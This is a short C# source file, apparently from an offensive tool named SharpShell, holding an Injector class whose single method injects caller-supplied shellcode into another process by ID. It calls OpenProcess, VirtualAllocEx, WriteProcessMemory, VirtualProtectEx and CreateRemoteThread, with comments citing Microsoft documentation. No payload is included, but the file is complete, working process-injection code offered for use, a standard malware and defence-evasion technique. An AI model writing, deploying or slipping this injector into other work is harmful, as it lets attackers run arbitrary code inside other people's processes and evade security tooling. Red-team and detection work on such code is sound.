using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace SharpShell
{
    internal static class Injector
    {
        // https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
        private static readonly UInt32 PROCESS_VM_WRITE = 0x0020;
        private static readonly UInt32 PROCESS_VM_OPERATION = 0x0008;
        private static readonly UInt32 PROCESS_CREATE_THREAD = 0x0002;

        // https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
        private static readonly UInt32 MEM_COMMIT = 0x1000;

        // https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants
        private static readonly UInt32 PAGE_READWRITE = 0x04;
        private static readonly UInt32 PAGE_EXECUTE_READ = 0x20;

        internal static void Execute(byte[] shellcode, int processID)
        {
            // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
            // Opens an existing local process object.
            // If the function succeeds, the return value is an open handle to the specified process.
            IntPtr hProcess = Win32.Api.OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, false, (uint)processID);

            //https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
            // Allocate memory in another process address space.
            // If the function succeeds, the return value is the base address of the allocated region of pages.
            IntPtr virtualAlloc = Win32.Api.VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_READWRITE);

            //https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
            // WriteProcessMemory copies the data from the specified buffer in the current process to the address range of the specified process.
            // If the function succeeds, the return value is nonzero.
            Win32.Api.WriteProcessMemory(hProcess, virtualAlloc, shellcode, new IntPtr(shellcode.Length), out uint bytesWritten);

            // https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex
            // Changes the protection on a region of committed pages in the virtual address space of a specified process.
            // If the function succeeds, the return value is nonzero.
            Win32.Api.VirtualProtectEx(hProcess, virtualAlloc, (UIntPtr)shellcode.Length, PAGE_EXECUTE_READ, out uint oldProtect);

            // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
            // Creates a thread that runs in the virtual address space of another process.
            // If the function succeeds, the return value is a handle to the new thread.
            IntPtr thread = Win32.Api.CreateRemoteThread(hProcess, IntPtr.Zero, new uint(), virtualAlloc, IntPtr.Zero, new uint(), IntPtr.Zero);

            // https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle
            // Closes an open object handle.
            // If the function succeeds, the return value is nonzero.
            Win32.Api.CloseHandle(hProcess);
        }
    }
}
